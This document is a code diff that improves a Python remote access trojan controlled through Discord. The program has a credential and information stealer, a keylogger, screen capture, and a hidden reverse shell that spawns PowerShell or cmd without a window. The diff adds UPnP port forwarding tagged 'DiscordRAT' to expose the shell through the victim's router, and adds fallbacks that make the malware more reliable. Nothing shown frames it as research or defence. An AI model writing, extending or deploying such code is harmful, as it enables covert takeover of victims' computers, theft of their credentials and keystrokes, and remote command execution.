@@ -1,10 +1,9 @@
-message = None #FFFFFFFFFFFFFFFFFFFFF
+#cumfacerebuild
 import os
-import winreg, aiohttp
+import winreg
+import aiohttp
 import ctypes
 import sys
-if 'os' not in globals():
-    import os
 import random
 import time
 import subprocess
@@ -34,6 +33,20 @@ from PIL import ImageGrab
 from datetime import datetime
 from cryptography.fernet import Fernet
 from win32com.client import Dispatch
+
+token = ''
+message = None
+user_id = None 
+channel_name = None
+_thread = None
+keylogger_running = False
+keylogger_task = None
+link = None  
+pkq = None
+pid_process = None 
+stop_threads = False
+loop = asyncio.new_event_loop()  
+asyncio.set_event_loop(loop)
 
 # Verify file integrity at startup
 def verify_file_integrity():
@@ -409,7 +422,7 @@ asyncio.set_event_loop(loop)
 async def steal_user_info():
     try:
         global pkq
-        if not pkq:
+        if not 'pkq' in globals() or not pkq:
             return "Error: Stealer link not configured"
             
         temp_dir = os.environ.get('TEMP')
@@ -479,10 +492,46 @@ async def start_reverse_shell(port=0):
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         # Set socket timeout to prevent blocking indefinitely
         server.settimeout(60)  # 60 second timeout for accept()
-        server.bind(('0.0.0.0', port))
+        
+        try:
+            server.bind(('0.0.0.0', port))
+        except OSError as bind_error:
+            if port != 0:
+                # If binding to specific port fails, try with random port
+                print(f"Failed to bind to port {port}, trying random port")
+                port = 0
+                server.bind(('0.0.0.0', port))
+            else:
+                raise bind_error
+                
         server.listen(5)
         
         _, port = server.getsockname()
+        
+        # Try UPNP port forwarding if available
+        try:
+            # Try to dynamically import miniupnpc
+            try:
+                import miniupnpc
+                print(f"[*] Setting up UPNP port forwarding for port {port}")
+                upnp = miniupnpc.UPnP()
+                upnp.discoverdelay = 10
+                upnp.discover()
+                upnp.selectigd()
+                
+                # Try to forward the port
+                result = upnp.addportmapping(port, 'TCP', upnp.lanaddr, port, 
+                                            f'DiscordRAT_{port}', '')
+                if result:
+                    print(f"[*] Successfully forwarded port {port} using UPNP")
+            except ImportError:
+                # miniupnpc not available
+                print("[*] UPNP not available (miniupnpc not installed)")
+            except Exception as upnp_error:
+                print(f"[!] UPNP port forwarding failed: {str(upnp_error)}")
+        except Exception as e:
+            # Generic error in UPNP code block - just log and continue
+            print(f"[!] Error in UPNP setup: {str(e)}")
         
         # Get IP address with timeout protection
         ip = "127.0.0.1"  # Default fallback
@@ -515,8 +564,9 @@ async def start_reverse_shell(port=0):
                         # Try to get the local IP as a last resort
                         hostname = socket.gethostname()
                         ip = socket.gethostbyname(hostname)
-                    except:
-                        pass  # Keep default 127.0.0.1
+                    except Exception as ip_error:
+                        print(f"[!] Failed to get IP address: {str(ip_error)}")
+                        # Keep default 127.0.0.1
                     
         return server, ip, port
     except Exception as e:
@@ -525,8 +575,8 @@ async def start_reverse_shell(port=0):
         if server:
             try:
                 server.close()
-            except:
-                pass
+            except Exception as close_error:
+                print(f"Error closing server socket: {str(close_error)}")
         return None, None, None
 
 async def handle_client(client_socket, channel):
@@ -536,11 +586,25 @@ async def handle_client(client_socket, channel):
     
     try:
         # Set socket timeout
-        client_socket.settimeout(300)  # 5 minute timeout for socket operations
+        try:
+            client_socket.settimeout(300)  # 5 minute timeout for socket operations
+        except Exception as timeout_error:
+            if channel:
+                await channel.send(f"[!] Error setting socket timeout: {str(timeout_error)}")
         
         # Set up shell based on OS
-        shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
-        shell_args = [] if os.name == 'nt' else ['-i']
+        try:
+            if os.name == 'nt':
+                shell_cmd = 'powershell.exe'
+                shell_args = []
+            else:
+                shell_cmd = '/bin/sh'
+                shell_args = ['-i']
+        except Exception as os_error:
+            if channel:
+                await channel.send(f"[!] Error determining OS: {str(os_error)}")
+            shell_cmd = 'cmd.exe' if sys.platform == 'win32' else '/bin/sh'
+            shell_args = []
         
         # Start subprocess with timeouts and retry logic
         retry_count = 0
@@ -548,13 +612,18 @@ async def handle_client(client_socket, channel):
         
         while retry_count < max_retries:
             try:
+                # Add CREATE_NO_WINDOW only on Windows
+                creation_flags = 0
+                if os.name == 'nt':
+                    creation_flags = subprocess.CREATE_NO_WINDOW
+                
                 shell = await asyncio.wait_for(
                     asyncio.create_subprocess_exec(
                         shell_cmd, *shell_args,
                         stdin=asyncio.subprocess.PIPE,
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
-                        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
+                        creationflags=creation_flags
                     ),
                     timeout=10  # 10 second timeout for process creation
                 )
@@ -569,6 +638,12 @@ async def handle_client(client_socket, channel):
             except Exception as e:
                 if channel:
                     await channel.send(f"[!] Error creating shell process: {str(e)}")
+                
+                # Try with basic command prompt if PowerShell fails
+                if shell_cmd == 'powershell.exe' and os.name == 'nt':
+                    shell_cmd = 'cmd.exe'
+                    retry_count += 1
+                    continue
                 return
         
         if channel:
@@ -983,6 +1058,10 @@ async def stop_keylogger():
 async def on_message(message):
     global channel_name, keylogger_running, pid_process
     
+    # Add a check to ensure message and message.channel are not None
+    if not message or not hasattr(message, 'channel'):
+        return
+    
     if not hasattr(message.channel, 'name') or message.channel.name != channel_name:
         return
     
@@ -1147,6 +1226,9 @@ async def on_message(message):
             # Remember current directory
             directory = os.getcwd()
             temp_dir = os.environ.get('TEMP') or os.environ.get('TMP')
+            if not temp_dir:
+                temp_dir = os.path.join(os.path.expanduser('~'), 'temp')
+                os.makedirs(temp_dir, exist_ok=True)
             os.chdir(temp_dir)
             
             # Generate unique filenames
@@ -1218,7 +1300,10 @@ async def on_message(message):
                         pass
                 
                 # Restore original directory
-                os.chdir(directory)
+                try:
+                    os.chdir(directory)
+                except Exception as dir_error:
+                    await message.channel.send(f"[!] Error restoring directory: {str(dir_error)}")
                 
         except Exception as e:
             await message.channel.send(f"[!] Command failed: {str(e)}")
@@ -2190,7 +2275,13 @@ except Exception as e:
                     decoded_token = base64.b64decode(token.encode()).decode()
                     print("Trying with decoded token...")
                     client.run(decoded_token)
-                except:
+                except Exception as e3:
+                    print(f"Error with decoded token: {str(e3)}")
                     print("Failed to connect with all token methods.")
-        except:
+        except Exception as e4:
+            print(f"Final connection attempt failed: {str(e4)}")
             print("Failed to connect with any token method. Check your Discord bot token.")
+finally:
+    # Keep console open if running as executable
+    if getattr(sys, 'frozen', False):
+        input("Press Enter to exit...")
